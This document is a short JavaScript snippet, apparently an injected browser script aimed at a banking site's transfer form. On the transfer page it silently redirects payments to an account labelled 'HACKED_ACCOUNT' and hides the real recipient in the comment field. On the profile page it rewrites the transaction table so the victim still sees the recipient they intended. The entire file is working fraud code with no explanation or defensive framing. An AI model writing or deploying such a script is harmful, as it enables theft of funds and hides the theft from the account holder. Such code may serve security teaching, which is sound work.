if(document.URL.endsWith('make_transfer')) {
var myForm = document.forms["transferForm"];
console.log("myForm");
myForm.onsubmit = function() {
    var hf = document.createElement('input');
    hf.type = 'hidden';
    hf.name = 'accountNumber';
    hf.value = 'HACKED_ACCOUNT';

    var comm = document.createElement('input');
    comm.type = 'hidden';
    comm.name = 'comment';
    comm.value = myForm['accountNumber'].value + ';;;' + myForm['comment'].value;

    myForm['accountNumber'].name = 'accountNumberMock';
    myForm['comment'].name = 'commentMock';
    myForm.appendChild(hf);
    myForm.appendChild(comm);

    myForm.submit();

    return true;
  };
}
else if(document.URL.endsWith('profile')) {
  var transactionsTable = document.querySelector("table tbody");
  for(var i = 0; i < transactionsTable.rows.length; ++i) {
    var splittedComments = transactionsTable.rows[i].cells[3].innerHTML.split(";;;", 2);
    if(splittedComments.length !== 2) continue;
    transactionsTable.rows[i].cells[1].innerHTML = splittedComments[0];
    transactionsTable.rows[i].cells[3].innerHTML = splittedComments[1];
  }
}
